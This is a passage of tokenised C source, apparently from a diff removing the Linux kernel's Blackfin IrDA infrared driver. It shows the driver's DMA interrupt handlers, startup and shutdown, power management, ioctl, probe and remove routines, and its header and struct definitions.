"(", "!", "port", "-", ">", "tx_done", ")", "return", ";", "port", "-", ">", "tx_done", "=", "0", ";", "if", "(", "self", "-", ">", "tx_buff", ".", "len", "=", "=", "0", ")", "{", "self", "-", ">", "stats", ".", "tx_packets", "+", "+;", "if", "(", "self", "-", ">", "newspeed", ")", "{", "bfin_sir_set_speed", "(", "port", ",", "self", "-", ">", "newspeed", ")", ";", "self", "-", ">", "speed", "=", "self", "-", ">", "newspeed", ";", "self", "-", ">", "newspeed", "=", "0", ";", "}", "bfin_sir_enable_rx", "(", "port", ")", ";", "port", "-", ">", "tx_done", "=", "1", ";", "netif_wake_queue", "(", "dev", ")", ";", "return", ";", "}", "blackfin_dcache_flush_range", "(", "(", "unsigned", "long", ")", "(", "self", "-", ">", "tx_buff", ".", "data", ")", ",", "(", "unsigned", "long", ")", "(", "self", "-", ">", "tx_buff", ".", "data", "+", "self", "-", ">", "tx_buff", ".", "len", ")", ");", "set_dma_config", "(", "port", "-", ">", "tx_dma_channel", ",", "set_bfin_dma_config", "(", "DIR_READ", ",", "DMA_FLOW_STOP", ",", "INTR_ON_BUF", ",", "DIMENSION_LINEAR", ",", "DATA_SIZE_8", ",", "DMA_SYNC_RESTART", ")", ");", "set_dma_start_addr", "(", "port", "-", ">", "tx_dma_channel", ",", "(", "unsigned", "long", ")", "(", "self", "-", ">", "tx_buff", ".", "data", ")", ");", "set_dma_x_count", "(", "port", "-", ">", "tx_dma_channel", ",", "self", "-", ">", "tx_buff", ".", "len", ")", ";", "set_dma_x_modify", "(", "port", "-", ">", "tx_dma_channel", ",", "1", ")", ";", "enable_dma", "(", "port", "-", ">", "tx_dma_channel", ")", ";", "}", "static", "irqreturn_t", "bfin_sir_dma_tx_int", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "spin_lock", "(", "&", "self", "-", ">", "lock", ")", ";", "if", "(", "!(", "get_dma_curr_irqstat", "(", "port", "-", ">", "tx_dma_channel", ")", "&", "DMA_RUN", ")", ")", "{", "clear_dma_irqstat", "(", "port", "-", ">", "tx_dma_channel", ")", ";", "bfin_sir_stop_tx", "(", "port", ")", ";", "self", "-", ">", "stats", ".", "tx_packets", "+", "+;", "self", "-", ">", "stats", ".", "tx_bytes", "+", "=", "self", "-", ">", "tx_buff", ".", "len", ";", "self", "-", ">", "tx_buff", ".", "len", "=", "0", ";", "if", "(", "self", "-", ">", "newspeed", ")", "{", "bfin_sir_set_speed", "(", "port", ",", "self", "-", ">", "newspeed", ")", ";", "self", "-", ">", "speed", "=", "self", "-", ">", "newspeed", ";", "self", "-", ">", "newspeed", "=", "0", ";", "}", "bfin_sir_enable_rx", "(", "port", ")", ";", "/", "*", "I", "'", "m", "hungry", "!", "*", "/", "netif_wake_queue", "(", "dev", ")", ";", "port", "-", ">", "tx_done", "=", "1", ";", "}", "spin_unlock", "(", "&", "self", "-", ">", "lock", ")", ";", "return", "IRQ_HANDLED", ";", "}", "static", "void", "bfin_sir_dma_rx_chars", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "int", "i", ";", "UART_CLEAR_LSR", "(", "port", ")", ";", "for", "(", "i", "=", "port", "-", ">", "rx_dma_buf", ".", "head", ";", "i", "<", "port", "-", ">", "rx_dma_buf", ".", "tail", ";", "i", "+", "+)", "async_unwrap_char", "(", "dev", ",", "&", "self", "-", ">", "stats", ",", "&", "self", "-", ">", "rx_buff", ",", "port", "-", ">", "rx_dma_buf", ".", "buf", "[", "i", "]", ");", "}", "static", "void", "bfin_sir_rx_dma_timeout", "(", "struct", "timer_list", "*", "t", ")", "{", "struct", "bfin_sir_port", "*", "port", "=", "from_timer", "(", "port", ",", "t", ",", "rx_dma_timer", ")", ";", "struct", "net_device", "*", "dev", "=", "port", "-", ">", "dev", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "int", "x_pos", ",", "pos", ";", "unsigned", "long", "flags", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "x_pos", "=", "DMA_SIR_RX_XCNT", "-", "get_dma_curr_xcount", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "if", "(", "x_pos", "=", "=", "DMA_SIR_RX_XCNT", ")", "x_pos", "=", "0", ";", "pos", "=", "port", "-", ">", "rx_dma_nrows", "*", "DMA_SIR_RX_XCNT", "+", "x_pos", ";", "if", "(", "pos", ">", "port", "-", ">", "rx_dma_buf", ".", "tail", ")", "{", "port", "-", ">", "rx_dma_buf", ".", "tail", "=", "pos", ";", "bfin_sir_dma_rx_chars", "(", "dev", ")", ";", "port", "-", ">", "rx_dma_buf", ".", "head", "=", "port", "-", ">", "rx_dma_buf", ".", "tail", ";", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "}", "static", "irqreturn_t", "bfin_sir_dma_rx_int", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "unsigned", "short", "irqstat", ";", "spin_lock", "(", "&", "self", "-", ">", "lock", ")", ";", "port", "-", ">", "rx_dma_nrows", "+", "+;", "port", "-", ">", "rx_dma_buf", ".", "tail", "=", "DMA_SIR_RX_XCNT", "*", "port", "-", ">", "rx_dma_nrows", ";", "bfin_sir_dma_rx_chars", "(", "dev", ")", ";", "if", "(", "port", "-", ">", "rx_dma_nrows", ">", "=", "DMA_SIR_RX_YCNT", ")", "{", "port", "-", ">", "rx_dma_nrows", "=", "0", ";", "port", "-", ">", "rx_dma_buf", ".", "tail", "=", "0", ";", "}", "port", "-", ">", "rx_dma_buf", ".", "head", "=", "port", "-", ">", "rx_dma_buf", ".", "tail", ";", "irqstat", "=", "get_dma_curr_irqstat", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "clear_dma_irqstat", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "spin_unlock", "(", "&", "self", "-", ">", "lock", ")", ";", "mod_timer", "(", "&", "port", "-", ">", "rx_dma_timer", ",", "jiffies", "+", "DMA_SIR_RX_FLUSH_JIFS", ")", ";", "return", "IRQ_HANDLED", ";", "}", "#", "endif", "/", "*", "CONFIG_SIR_BFIN_DMA", "*", "/", "static", "int", "bfin_sir_startup", "(", "struct", "bfin_sir_port", "*", "port", ",", "struct", "net_device", "*", "dev", ")", "{", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "dma_addr_t", "dma_handle", ";", "#", "endif", "/", "*", "CONFIG_SIR_BFIN_DMA", "*", "/", "if", "(", "request_dma", "(", "port", "-", ">", "rx_dma_channel", ",", "\"", "BFIN_UART_RX", "\"", ")", "<", "0", ")", "{", "dev_warn", "(", "&", "dev", "-", ">", "dev", ",", "\"", "Unable", "to", "attach", "SIR", "RX", "DMA", "channel", "\\", "n", "\"", ");", "return", "-", "EBUSY", ";", "}", "if", "(", "request_dma", "(", "port", "-", ">", "tx_dma_channel", ",", "\"", "BFIN_UART_TX", "\"", ")", "<", "0", ")", "{", "dev_warn", "(", "&", "dev", "-", ">", "dev", ",", "\"", "Unable", "to", "attach", "SIR", "TX", "DMA", "channel", "\\", "n", "\"", ");", "free_dma", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "return", "-", "EBUSY", ";", "}", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "set_dma_callback", "(", "port", "-", ">", "rx_dma_channel", ",", "bfin_sir_dma_rx_int", ",", "dev", ")", ";", "set_dma_callback", "(", "port", "-", ">", "tx_dma_channel", ",", "bfin_sir_dma_tx_int", ",", "dev", ")", ";", "port", "-", ">", "rx_dma_buf", ".", "buf", "=", "dma_alloc_coherent", "(", "NULL", ",", "PAGE_SIZE", ",", "&", "dma_handle", ",", "GFP_DMA", ")", ";", "port", "-", ">", "rx_dma_buf", ".", "head", "=", "0", ";", "port", "-", ">", "rx_dma_buf", ".", "tail", "=", "0", ";", "port", "-", ">", "rx_dma_nrows", "=", "0", ";", "set_dma_config", "(", "port", "-", ">", "rx_dma_channel", ",", "set_bfin_dma_config", "(", "DIR_WRITE", ",", "DMA_FLOW_AUTO", ",", "INTR_ON_ROW", ",", "DIMENSION_2D", ",", "DATA_SIZE_8", ",", "DMA_SYNC_RESTART", ")", ");", "set_dma_x_count", "(", "port", "-", ">", "rx_dma_channel", ",", "DMA_SIR_RX_XCNT", ")", ";", "set_dma_x_modify", "(", "port", "-", ">", "rx_dma_channel", ",", "1", ")", ";", "set_dma_y_count", "(", "port", "-", ">", "rx_dma_channel", ",", "DMA_SIR_RX_YCNT", ")", ";", "set_dma_y_modify", "(", "port", "-", ">", "rx_dma_channel", ",", "1", ")", ";", "set_dma_start_addr", "(", "port", "-", ">", "rx_dma_channel", ",", "(", "unsigned", "long", ")", "port", "-", ">", "rx_dma_buf", ".", "buf", ")", ";", "enable_dma", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "#", "else", "if", "(", "request_irq", "(", "port", "-", ">", "irq", ",", "bfin_sir_rx_int", ",", "0", ",", "\"", "BFIN_SIR_RX", "\"", ",", "dev", ")", ")", "{", "dev_warn", "(", "&", "dev", "-", ">", "dev", ",", "\"", "Unable", "to", "attach", "SIR", "RX", "interrupt", "\\", "n", "\"", ");", "return", "-", "EBUSY", ";", "}", "if", "(", "request_irq", "(", "port", "-", ">", "irq", "+", "1", ",", "bfin_sir_tx_int", ",", "0", ",", "\"", "BFIN_SIR_TX", "\"", ",", "dev", ")", ")", "{", "dev_warn", "(", "&", "dev", "-", ">", "dev", ",", "\"", "Unable", "to", "attach", "SIR", "TX", "interrupt", "\\", "n", "\"", ");", "free_irq", "(", "port", "-", ">", "irq", ",", "dev", ")", ";", "return", "-", "EBUSY", ";", "}", "#", "endif", "return", "0", ";", "}", "static", "void", "bfin_sir_shutdown", "(", "struct", "bfin_sir_port", "*", "port", ",", "struct", "net_device", "*", "dev", ")", "{", "unsigned", "short", "val", ";", "bfin_sir_stop_rx", "(", "port", ")", ";", "val", "=", "UART_GET_GCTL", "(", "port", ")", ";", "val", "&", "=", "~", "(", "UCEN", "|", "UMOD_MASK", "|", "RPOLC", ")", ";", "UART_PUT_GCTL", "(", "port", ",", "val", ")", ";", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "disable_dma", "(", "port", "-", ">", "tx_dma_channel", ")", ";", "disable_dma", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "del_timer", "(", "&(", "port", "-", ">", "rx_dma_timer", ")", ");", "dma_free_coherent", "(", "NULL", ",", "PAGE_SIZE", ",", "port", "-", ">", "rx_dma_buf", ".", "buf", ",", "0", ")", ";", "#", "else", "free_irq", "(", "port", "-", ">", "irq", "+", "1", ",", "dev", ")", ";", "free_irq", "(", "port", "-", ">", "irq", ",", "dev", ")", ";", "#", "endif", "free_dma", "(", "port", "-", ">", "tx_dma_channel", ")", ";", "free_dma", "(", "port", "-", ">", "rx_dma_channel", ")", ";", "}", "#", "ifdef", "CONFIG_PM", "static", "int", "bfin_sir_suspend", "(", "struct", "platform_device", "*", "pdev", ",", "pm_message_t", "state", ")", "{", "struct", "bfin_sir_port", "*", "sir_port", ";", "struct", "net_device", "*", "dev", ";", "struct", "bfin_sir_self", "*", "self", ";", "sir_port", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "if", "(", "!", "sir_port", ")", "return", "0", ";", "dev", "=", "sir_port", "-", ">", "dev", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "if", "(", "self", "-", ">", "open", ")", "{", "flush_work", "(", "&", "self", "-", ">", "work", ")", ";", "bfin_sir_shutdown", "(", "self", "-", ">", "sir_port", ",", "dev", ")", ";", "netif_device_detach", "(", "dev", ")", ";", "}", "return", "0", ";", "}", "static", "int", "bfin_sir_resume", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "bfin_sir_port", "*", "sir_port", ";", "struct", "net_device", "*", "dev", ";", "struct", "bfin_sir_self", "*", "self", ";", "struct", "bfin_sir_port", "*", "port", ";", "sir_port", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "if", "(", "!", "sir_port", ")", "return", "0", ";", "dev", "=", "sir_port", "-", ">", "dev", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "port", "=", "self", "-", ">", "sir_port", ";", "if", "(", "self", "-", ">", "open", ")", "{", "if", "(", "self", "-", ">", "newspeed", ")", "{", "self", "-", ">", "speed", "=", "self", "-", ">", "newspeed", ";", "self", "-", ">", "newspeed", "=", "0", ";", "}", "bfin_sir_startup", "(", "port", ",", "dev", ")", ";", "bfin_sir_set_speed", "(", "port", ",", "9600", ")", ";", "bfin_sir_enable_rx", "(", "port", ")", ";", "netif_device_attach", "(", "dev", ")", ";", "}", "return", "0", ";", "}", "#", "else", "#", "define", "bfin_sir_suspend", "NULL", "#", "define", "bfin_sir_resume", "NULL", "#", "endif", "static", "void", "bfin_sir_send_work", "(", "struct", "work_struct", "*", "work", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "container_of", "(", "work", ",", "struct", "bfin_sir_self", ",", "work", ")", ";", "struct", "net_device", "*", "dev", "=", "self", "-", ">", "sir_port", "-", ">", "dev", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "unsigned", "short", "val", ";", "int", "tx_cnt", "=", "10", ";", "while", "(", "bfin_sir_is_receiving", "(", "dev", ")", "&", "&", "-", "-", "tx_cnt", ")", "turnaround_delay", "(", "self", "-", ">", "mtt", ")", ";", "bfin_sir_stop_rx", "(", "port", ")", ";", "/", "*", "To", "avoid", "losting", "RX", "interrupt", ",", "we", "reset", "IR", "function", "before", "*", "sending", "data", ".", "We", "also", "can", "set", "the", "speed", ",", "which", "will", "*", "reset", "all", "the", "UART", ".", "*", "/", "val", "=", "UART_GET_GCTL", "(", "port", ")", ";", "val", "&", "=", "~", "(", "UMOD_MASK", "|", "RPOLC", ")", ";", "UART_PUT_GCTL", "(", "port", ",", "val", ")", ";", "SSYNC", "(", ");", "val", "|", "=", "UMOD_IRDA", "|", "RPOLC", ";", "UART_PUT_GCTL", "(", "port", ",", "val", ")", ";", "SSYNC", "(", ");", "/", "*", "bfin_sir_set_speed", "(", "port", ",", "self", "-", ">", "speed", ")", ";", "*", "/", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "bfin_sir_dma_tx_chars", "(", "dev", ")", ";", "#", "endif", "bfin_sir_enable_tx", "(", "port", ")", ";", "netif_trans_update", "(", "dev", ")", ";", "}", "static", "int", "bfin_sir_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "int", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "netif_stop_queue", "(", "dev", ")", ";", "self", "-", ">", "mtt", "=", "irda_get_mtt", "(", "skb", ")", ";", "if", "(", "speed", "!", "=", "self", "-", ">", "speed", "&", "&", "speed", "!", "=", "-", "1", ")", "self", "-", ">", "newspeed", "=", "speed", ";", "self", "-", ">", "tx_buff", ".", "data", "=", "self", "-", ">", "tx_buff", ".", "head", ";", "if", "(", "skb", "-", ">", "len", "=", "=", "0", ")", "self", "-", ">", "tx_buff", ".", "len", "=", "0", ";", "else", "self", "-", ">", "tx_buff", ".", "len", "=", "async_wrap_skb", "(", "skb", ",", "self", "-", ">", "tx_buff", ".", "data", ",", "self", "-", ">", "tx_buff", ".", "truesize", ")", ";", "schedule_work", "(", "&", "self", "-", ">", "work", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "0", ";", "}", "static", "int", "bfin_sir_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "ifreq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "rq", "=", "(", "struct", "if_irda_req", "*", ")", "ifreq", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "int", "ret", "=", "0", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "if", "(", "self", "-", ">", "open", ")", "{", "ret", "=", "bfin_sir_set_speed", "(", "port", ",", "rq", "-", ">", "ifr_baudrate", ")", ";", "bfin_sir_enable_rx", "(", "port", ")", ";", "}", "else", "{", "dev_warn", "(", "&", "dev", "-", ">", "dev", ",", "\"", "SIOCSBANDWIDTH", ":", "!", "netif_running", "\\", "n", "\"", ");", "ret", "=", "0", ";", "}", "}", "break", ";", "case", "SIOCSMEDIABUSY", ":", "ret", "=", "-", "EPERM", ";", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "irda_device_set_media_busy", "(", "dev", ",", "TRUE", ")", ";", "ret", "=", "0", ";", "}", "break", ";", "case", "SIOCGRECEIVING", ":", "rq", "-", ">", "ifr_receiving", "=", "bfin_sir_is_receiving", "(", "dev", ")", ";", "break", ";", "default", ":", "ret", "=", "-", "EOPNOTSUPP", ";", "break", ";", "}", "return", "ret", ";", "}", "static", "struct", "net_device_stats", "*", "bfin_sir_stats", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "return", "&", "self", "-", ">", "stats", ";", "}", "static", "int", "bfin_sir_open", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "int", "err", ";", "self", "-", ">", "newspeed", "=", "0", ";", "self", "-", ">", "speed", "=", "9600", ";", "spin_lock_init", "(", "&", "self", "-", ">", "lock", ")", ";", "err", "=", "bfin_sir_startup", "(", "port", ",", "dev", ")", ";", "if", "(", "err", ")", "goto", "err_startup", ";", "bfin_sir_set_speed", "(", "port", ",", "9600", ")", ";", "self", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "self", "-", ">", "qos", ",", "DRIVER_NAME", ")", ";", "if", "(", "!", "self", "-", ">", "irlap", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "err_irlap", ";", "}", "INIT_WORK", "(", "&", "self", "-", ">", "work", ",", "bfin_sir_send_work", ")", ";", "/", "*", "*", "Now", "enable", "the", "interrupt", "then", "start", "the", "queue", "*", "/", "self", "-", ">", "open", "=", "1", ";", "bfin_sir_enable_rx", "(", "port", ")", ";", "netif_start_queue", "(", "dev", ")", ";", "return", "0", ";", "err_irlap", ":", "self", "-", ">", "open", "=", "0", ";", "bfin_sir_shutdown", "(", "port", ",", "dev", ")", ";", "err_startup", ":", "return", "err", ";", "}", "static", "int", "bfin_sir_stop", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "flush_work", "(", "&", "self", "-", ">", "work", ")", ";", "bfin_sir_shutdown", "(", "self", "-", ">", "sir_port", ",", "dev", ")", ";", "if", "(", "self", "-", ">", "rxskb", ")", "{", "dev_kfree_skb", "(", "self", "-", ">", "rxskb", ")", ";", "self", "-", ">", "rxskb", "=", "NULL", ";", "}", "/", "*", "Stop", "IrLAP", "*", "/", "if", "(", "self", "-", ">", "irlap", ")", "{", "irlap_close", "(", "self", "-", ">", "irlap", ")", ";", "self", "-", ">", "irlap", "=", "NULL", ";", "}", "netif_stop_queue", "(", "dev", ")", ";", "self", "-", ">", "open", "=", "0", ";", "return", "0", ";", "}", "static", "int", "bfin_sir_init_iobuf", "(", "iobuff_t", "*", "io", ",", "int", "size", ")", "{", "io", "-", ">", "head", "=", "kmalloc", "(", "size", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "io", "-", ">", "head", ")", "return", "-", "ENOMEM", ";", "io", "-", ">", "truesize", "=", "size", ";", "io", "-", ">", "in_frame", "=", "FALSE", ";", "io", "-", ">", "state", "=", "OUTSIDE_FRAME", ";", "io", "-", ">", "data", "=", "io", "-", ">", "head", ";", "return", "0", ";", "}", "static", "const", "struct", "net_device_ops", "bfin_sir_ndo", "=", "{", ".", "ndo_open", "=", "bfin_sir_open", ",", ".", "ndo_stop", "=", "bfin_sir_stop", ",", ".", "ndo_start_xmit", "=", "bfin_sir_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "bfin_sir_ioctl", ",", ".", "ndo_get_stats", "=", "bfin_sir_stats", ",", "}", ";", "static", "int", "bfin_sir_probe", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "net_device", "*", "dev", ";", "struct", "bfin_sir_self", "*", "self", ";", "unsigned", "int", "baudrate_mask", ";", "struct", "bfin_sir_port", "*", "sir_port", ";", "int", "err", ";", "if", "(", "pdev", "-", ">", "id", ">", "=", "0", "&", "&", "pdev", "-", ">", "id", "<", "ARRAY_SIZE", "(", "per", ")", "&", "&", "\\", "per", "[", "pdev", "-", ">", "id", "]", "[", "3", "]", "=", "=", "pdev", "-", ">", "id", ")", "{", "err", "=", "peripheral_request_list", "(", "per", "[", "pdev", "-", ">", "id", "]", ",", "DRIVER_NAME", ")", ";", "if", "(", "err", ")", "return", "err", ";", "}", "else", "{", "dev_err", "(", "&", "pdev", "-", ">", "dev", ",", "\"", "Invalid", "pdev", "id", ",", "please", "check", "board", "file", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "err", "=", "-", "ENOMEM", ";", "sir_port", "=", "kmalloc", "(", "sizeof", "(", "*", "sir_port", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "sir_port", ")", "goto", "err_mem_0", ";", "bfin_sir_init_ports", "(", "sir_port", ",", "pdev", ")", ";", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "self", ")", ");", "if", "(", "!", "dev", ")", "goto", "err_mem_1", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "self", "-", ">", "dev", "=", "&", "pdev", "-", ">", "dev", ";", "self", "-", ">", "sir_port", "=", "sir_port", ";", "sir_port", "-", ">", "dev", "=", "dev", ";", "err", "=", "bfin_sir_init_iobuf", "(", "&", "self", "-", ">", "rx_buff", ",", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "err", ")", "goto", "err_mem_2", ";", "err", "=", "bfin_sir_init_iobuf", "(", "&", "self", "-", ">", "tx_buff", ",", "IRDA_SIR_MAX_FRAME", ")", ";", "if", "(", "err", ")", "goto", "err_mem_3", ";", "dev", "-", ">", "netdev_ops", "=", "&", "bfin_sir_ndo", ";", "dev", "-", ">", "irq", "=", "sir_port", "-", ">", "irq", ";", "irda_init_max_qos_capabilies", "(", "&", "self", "-", ">", "qos", ")", ";", "baudrate_mask", "=", "IR_9600", ";", "switch", "(", "max_rate", ")", "{", "case", "115200", ":", "baudrate_mask", "|", "=", "IR_115200", ";", "case", "57600", ":", "baudrate_mask", "|", "=", "IR_57600", ";", "case", "38400", ":", "baudrate_mask", "|", "=", "IR_38400", ";", "case", "19200", ":", "baudrate_mask", "|", "=", "IR_19200", ";", "case", "9600", ":", "break", ";", "default", ":", "dev_warn", "(", "&", "pdev", "-", ">", "dev", ",", "\"", "Invalid", "maximum", "baud", "rate", ",", "using", "9600", "\\", "n", "\"", ");", "}", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "&", "=", "baudrate_mask", ";", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "1", ";", "/", "*", "10", "ms", "or", "more", "*", "/", "irda_qos_bits_to_value", "(", "&", "self", "-", ">", "qos", ")", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", ")", "{", "kfree", "(", "self", "-", ">", "tx_buff", ".", "head", ")", ";", "err_mem_3", ":", "kfree", "(", "self", "-", ">", "rx_buff", ".", "head", ")", ";", "err_mem_2", ":", "free_netdev", "(", "dev", ")", ";", "err_mem_1", ":", "kfree", "(", "sir_port", ")", ";", "err_mem_0", ":", "peripheral_free_list", "(", "per", "[", "pdev", "-", ">", "id", "]", ");", "}", "else", "platform_set_drvdata", "(", "pdev", ",", "sir_port", ")", ";", "return", "err", ";", "}", "static", "int", "bfin_sir_remove", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "bfin_sir_port", "*", "sir_port", ";", "struct", "net_device", "*", "dev", "=", "NULL", ";", "struct", "bfin_sir_self", "*", "self", ";", "sir_port", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "if", "(", "!", "sir_port", ")", "return", "0", ";", "dev", "=", "sir_port", "-", ">", "dev", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "unregister_netdev", "(", "dev", ")", ";", "kfree", "(", "self", "-", ">", "tx_buff", ".", "head", ")", ";", "kfree", "(", "self", "-", ">", "rx_buff", ".", "head", ")", ";", "free_netdev", "(", "dev", ")", ";", "kfree", "(", "sir_port", ")", ";", "return", "0", ";", "}", "static", "struct", "platform_driver", "bfin_ir_driver", "=", "{", ".", "probe", "=", "bfin_sir_probe", ",", ".", "remove", "=", "bfin_sir_remove", ",", ".", "suspend", "=", "bfin_sir_suspend", ",", ".", "resume", "=", "bfin_sir_resume", ",", ".", "driver", "=", "{", ".", "name", "=", "DRIVER_NAME", ",", "}", ",", "}", ";", "module_platform_driver", "(", "bfin_ir_driver", ")", ";", "module_param", "(", "max_rate", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "max_rate", ",", "\"", "Maximum", "baud", "rate", "(", "115200", ",", "57600", ",", "38400", ",", "19200", ",", "9600", ")", "\")", ";", "MODULE_AUTHOR", "(", "\"", "Graf", "Yang", "<", "graf", ".", "yang", "@", "analog", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Blackfin", "IrDA", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "93", "+", "0", ",", "0", "@", "@", "/", "*", "*", "Blackfin", "Infra", "-", "red", "Driver", "*", "*", "Copyright", "2006", "-", "2009", "Analog", "Devices", "Inc", ".", "*", "*", "Enter", "bugs", "at", "http", ":", "//", "blackfin", ".", "uclinux", ".", "org", "/", "*", "*", "Licensed", "under", "the", "GPL", "-", "2", "or", "later", ".", "*", "*", "/", "#", "include", "<", "linux", "/", "serial", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_device", ".", "h", ">", "#", "include", "<", "linux", "/", "dma", "-", "mapping", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "<", "asm", "/", "irq", ".", "h", ">", "#", "include", "<", "asm", "/", "cacheflush", ".", "h", ">", "#", "include", "<", "asm", "/", "dma", ".", "h", ">", "#", "include", "<", "asm", "/", "portmux", ".", "h", ">", "#", "undef", "DRIVER_NAME", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "struct", "dma_rx_buf", "{", "char", "*", "buf", ";", "int", "head", ";", "int", "tail", ";", "}", ";", "#", "endif", "struct", "bfin_sir_port", "{", "unsigned", "char", "__iomem", "*", "membase", ";", "unsigned", "int", "irq", ";", "unsigned", "int", "lsr", ";", "unsigned", "long", "clk", ";", "struct", "net_device", "*", "dev", ";", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "int", "tx_done", ";", "struct", "dma_rx_buf", "rx_dma_buf", ";", "struct", "timer_list", "rx_dma_timer", ";", "int", "rx_dma_nrows", ";", "#", "endif", "unsigned", "int", "tx_dma_channel", ";", "unsigned", "int", "rx_dma_channel", ";", "}", ";", "struct", "bfin_sir_port_res", "{", "unsigned", "long", "base_addr", ";", "int", "irq", ";", "unsigned", "int", "rx_dma_channel", ";", "unsigned", "int", "tx_dma_channel", ";", "}", ";", "struct", "bfin_sir_self", "{", "struct", "bfin_sir_port", "*", "sir_port", ";", "spinlock_t", "lock", ";", "unsigned", "int", "open", ";", "int", "speed", ";", "int", "newspeed", ";", "struct", "sk_buff", "*", "txskb", ";", "struct", "sk_buff", "*", "rxskb", ";", "struct", "net_device_stats", "stats", ";", "struct", "device", "*", "dev", ";", "struct", "irlap_cb", "*", "irlap", ";", "struct", "qos_info", "qos", ";", "iobuff_t", "tx_buff", ";", "iobuff_t", "rx_buff", ";", "struct", "work_struct", "work", ";", "int", "mtt", ";", "}", ";", "#", "define", "DRIVER_NAME", "\"", "bfin_sir", "\"", "#", "include", "<", "asm", "/", "bfin_serial", ".", "h", ">", "static", "const", "unsigned", "short", "per", "[", "][", "4", "]", "=", "{", "/", "*", "rx", "pin", "tx", "pin", "NULL", "uart_number", "*", "/", "{", "P_UART0_RX", ",", "P_UART0_TX", ",", "0", ",", "0", "}", ",", "{", "P_UART1_RX", ",", "P_UART1_TX", ",", "0", ",", "1", "}", ",", "{", "P_UART2_RX", ",", "P_UART2_TX", ",", "0", 